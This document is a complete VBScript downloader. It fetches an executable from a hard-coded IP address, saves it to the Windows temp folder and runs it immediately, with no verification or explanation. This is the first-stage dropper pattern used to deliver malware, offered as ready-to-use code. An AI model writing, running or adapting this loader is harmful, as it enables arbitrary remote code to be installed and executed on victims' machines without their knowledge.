' VBScript to download and execute a file

Dim url, destination, objHTTP, objFSO, objShell

' URL of the file to download
url = "http://95.214.25.100/server/onlyfortest/test.exe"

' Destination path to save the downloaded file
destination = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%TEMP%") & "\yourfile.exe"

' Create objects
Set objHTTP = CreateObject("MSXML2.ServerXMLHTTP.6.0")
Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objShell = CreateObject("WScript.Shell")

' Download the file
objHTTP.Open "GET", url, False
objHTTP.send

' Save the downloaded file
If objHTTP.Status = 200 Then
    Set objStream = CreateObject("ADODB.Stream")
    objStream.Open
    objStream.Type = 1 ' Binary
    objStream.Write objHTTP.responseBody
    objStream.Position = 0
    If objFSO.FileExists(destination) Then objFSO.DeleteFile destination
    objStream.SaveToFile destination
    objStream.Close
End If

' Execute the downloaded file
If objFSO.FileExists(destination) Then
    objShell.Run Chr(34) & destination & Chr(34), 1, False
End If

Set objHTTP = Nothing
Set objFSO = Nothing
Set objShell = Nothing
